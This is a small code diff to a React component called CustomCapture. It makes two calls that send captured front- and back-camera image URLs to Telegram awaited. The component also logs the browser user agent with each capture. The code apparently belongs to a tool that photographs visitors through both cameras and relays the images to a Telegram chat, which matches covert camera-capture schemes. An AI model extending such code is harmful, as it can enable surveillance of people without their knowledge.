@@ -199,7 +199,7 @@ const CustomCapture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [FRONT-${captureCount}]`
             });
-            notifyTelegram(urlData.publicUrl, 'front', captureCount);
+            await notifyTelegram(urlData.publicUrl, 'front', captureCount);
           }
         }
         
@@ -224,7 +224,7 @@ const CustomCapture = () => {
               image_data: urlData.publicUrl,
               user_agent: `${navigator.userAgent} [BACK-${captureCount}]`
             });
-            notifyTelegram(urlData.publicUrl, 'back', captureCount);
+            await notifyTelegram(urlData.publicUrl, 'back', captureCount);
           }
         }
         
